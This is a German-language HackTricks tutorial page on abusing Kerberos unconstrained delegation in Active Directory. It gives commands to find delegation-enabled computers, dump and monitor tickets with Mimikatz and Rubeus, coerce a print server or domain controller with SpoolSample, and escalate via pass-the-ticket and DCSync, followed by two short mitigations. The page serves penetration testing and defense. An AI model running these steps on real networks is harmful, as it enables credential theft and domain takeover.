# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Dies ist eine Funktion, die ein Domain-Administrator für jeden **Computer** innerhalb der Domäne festlegen kann. Jedes Mal, wenn sich ein **Benutzer** an dem Computer anmeldet, wird eine **Kopie des TGT** dieses Benutzers **in das TGS** gesendet, das vom DC bereitgestellt wird, **und im Speicher in LSASS gespeichert**. Wenn Sie also Administratorrechte auf der Maschine haben, können Sie die Tickets **dumpen und die Benutzer** auf jeder Maschine impersonieren.

Wenn sich also ein Domain-Admin an einem Computer mit aktivierter Funktion "Unconstrained Delegation" anmeldet und Sie lokale Administratorrechte auf dieser Maschine haben, können Sie das Ticket dumpen und den Domain-Admin überall impersonieren (Domain-Privesc).

Sie können **Computerobjekte mit diesem Attribut finden**, indem Sie überprüfen, ob das [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) Attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) enthält. Sie können dies mit einem LDAP-Filter von ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ tun, was powerview macht:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Lade das Ticket des Administrators (oder des Opferbenutzers) im Speicher mit **Mimikatz** oder **Rubeus für ein** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Mehr Informationen: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Weitere Informationen zur Unconstrained Delegation bei ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Zwangs-Authentifizierung**

Wenn ein Angreifer in der Lage ist, einen Computer zu **kompromittieren, der für "Unconstrained Delegation" erlaubt ist**, könnte er einen **Druckserver** **täuschen**, um sich **automatisch anzumelden** und ein **TGT** im Speicher des Servers zu speichern.\
Dann könnte der Angreifer einen **Pass the Ticket-Angriff durchführen, um** das Benutzerkonto des Druckserver-Computers zu impersonieren.

Um einen Druckserver dazu zu bringen, sich gegen eine beliebige Maschine anzumelden, kannst du [**SpoolSample**](https://github.com/leechristensen/SpoolSample) verwenden:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Wenn das TGT von einem Domänencontroller stammt, könnten Sie einen [**DCSync-Angriff**](acl-persistence-abuse/index.html#dcsync) durchführen und alle Hashes vom DC erhalten.\
[**Weitere Informationen zu diesem Angriff auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Hier finden Sie weitere Möglichkeiten, um **eine Authentifizierung zu erzwingen:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Minderung

- Begrenzen Sie DA/Admin-Anmeldungen auf bestimmte Dienste
- Setzen Sie "Konto ist sensibel und kann nicht delegiert werden" für privilegierte Konten.

{{#include ../../banners/hacktricks-training.md}}
